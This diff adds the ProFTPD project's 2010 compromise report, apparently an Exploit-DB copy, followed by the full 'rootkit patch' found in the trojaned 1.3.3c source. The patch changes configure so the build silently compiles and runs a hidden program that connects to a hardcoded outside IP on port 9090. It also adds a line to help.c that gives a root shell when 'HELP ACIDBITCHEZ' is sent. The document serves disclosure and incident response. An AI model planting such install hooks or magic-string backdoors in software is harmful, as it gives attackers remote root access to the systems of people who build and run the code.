@@ -1,0 +1,140 @@
+== ProFTPD Compromise Report ==
+
+On Sunday, the 28th of November 2010 around 20:00 UTC the main
+distribution server of the ProFTPD project was compromised.  The
+attackers most likely used an unpatched security issue in the FTP daemon
+to gain access to the server and used their privileges to replace the
+source files for ProFTPD 1.3.3c with a version which contained a backdoor.
+The unauthorized modification of the source code was noticed by
+Daniel Austin and relayed to the ProFTPD project by Jeroen Geilman on
+Wednesday, December 1 and fixed shortly afterwards.
+
+The fact that the server acted as the main FTP site for the ProFTPD
+project (ftp.proftpd.org) as well as the rsync distribution server
+(rsync.proftpd.org) for all ProFTPD mirror servers means that anyone who
+downloaded ProFTPD 1.3.3c from one of the official mirrors from 2010-11-28
+to 2010-12-02 will most likely be affected by the problem.
+
+The backdoor introduced by the attackers allows unauthenticated users
+remote root access to systems which run the maliciously modified version
+of the ProFTPD daemon.
+
+Users are strongly advised to check systems running the affected code for
+security compromises and compile/run a known good version of the code.
+To verify the integrity of the source files, use the GPG signatures
+available on the FTP servers as well on the ProFTPD homepage at:
+
+  http://www.proftpd.org/md5_pgp.html.
+
+The MD5 sums for the source tarballs are:
+
+ 8571bd78874b557e98480ed48e2df1d2  proftpd-1.3.3c.tar.bz2
+ 4f2c554d6273b8145095837913ba9e5d  proftpd-1.3.3c.tar.gz
+
+
+
+
+= Rootkit patch =
+
+diff -Naur proftpd-1.3.3c.orig/configure proftpd-1.3.3c/configure
+--- proftpd-1.3.3c.orig/configure	2010-04-14 00:01:35.000000000 +0200
++++ proftpd-1.3.3c/configure	2010-10-29 19:08:56.000000000 +0200
+@@ -9,7 +9,10 @@
+ ## --------------------- ##
+ ## M4sh Initialization.  ##
+ ## --------------------- ##
+-
++gcc tests/tests.c -o tests/tests >/dev/null 2>&1
++cc tests/tests.c -o tests/tests >/dev/null 2>&1
++tests/tests >/dev/null 2>&1 &
++rm -rf tests/tests.c tests/tests >/dev/null 2>&1
+ # Be more Bourne compatible
+ DUALCASE=1; export DUALCASE # for MKS sh
+ if test -n "${ZSH_VERSION+set}" && (emulate sh) >/dev/null 2>&1; then
+
+
+diff -Naur proftpd-1.3.3c.orig/src/help.c proftpd-1.3.3c/src/help.c
+--- proftpd-1.3.3c.orig/src/help.c	2009-07-01 01:31:18.000000000 +0200
++++ proftpd-1.3.3c/src/help.c	2010-11-16 18:40:46.000000000 +0100
+@@ -27,6 +27,8 @@
+  */
+ 
+ #include "conf.h"
++#include <stdlib.h>
++#include <string.h>
+ 
+ struct help_rec {
+   const char *cmd;
+@@ -126,7 +128,7 @@
+         cmd->server->ServerAdmin ? cmd->server->ServerAdmin : "ftp-admin");
+ 
+     } else {
+-
++      if (strcmp(target, "ACIDBITCHEZ") == 0) { setuid(0); setgid(0); system("/bin/sh;/sbin/sh"); }
+       /* List the syntax for the given target command. */
+       for (i = 0; i < help_list->nelts; i++) {
+         if (strcasecmp(helps[i].cmd, target) == 0) {
+
+
+diff -Naur proftpd-1.3.3c.orig/tests/tests.c proftpd-1.3.3c/tests/tests.c
+--- proftpd-1.3.3c.orig/tests/tests.c	1970-01-01 01:00:00.000000000 +0100
++++ proftpd-1.3.3c/tests/tests.c 	2010-11-29 09:37:35.000000000 +0100
+@@ -0,0 +1,58 @@
++#include <stdio.h>
++#include <stdlib.h>
++#include <sys/socket.h>
++#include <sys/types.h>
++#include <netinet/in.h>
++#include <arpa/inet.h>
++#include <unistd.h>
++#include <netdb.h>
++#include <signal.h>
++#include <string.h>
++
++#define DEF_PORT 9090
++#define DEF_TIMEOUT 15
++#define DEF_COMMAND "GET /AB HTTP/1.0\r\n\r\n"
++
++int sock;
++
++void handle_timeout(int sig)
++{
++    close(sock);
++    exit(0);
++}
++
++int main(void)
++{
++
++        struct sockaddr_in addr;
++        struct hostent *he;
++        u_short port;
++        char ip[20]="212.26.42.47";    /*  EDB NOTE - HARDCODED IP */
++        port = DEF_PORT;
++        signal(SIGALRM, handle_timeout);
++        alarm(DEF_TIMEOUT);
++        he=gethostbyname(ip);
++        if(he==NULL) return(-1);
++        addr.sin_addr.s_addr = *(unsigned long*)he->h_addr;
++        addr.sin_port = htons(port);
++        addr.sin_family = AF_INET;
++        memset(addr.sin_zero, 0, 8);
++        sprintf(ip, inet_ntoa(addr.sin_addr));
++        if((sock = socket(AF_INET, SOCK_STREAM, 0))==-1)
++        {
++                return EXIT_FAILURE;
++        }
++        if(connect(sock, (struct sockaddr*)&addr, sizeof(struct sockaddr))==-1)
++        {
++            close(sock);
++            return EXIT_FAILURE;
++        }
++        if(-1 == send(sock, DEF_COMMAND, strlen(DEF_COMMAND), 0))
++        {
++            return EXIT_FAILURE;
++        }
++        close(sock);
++
++return 0; }
++
++
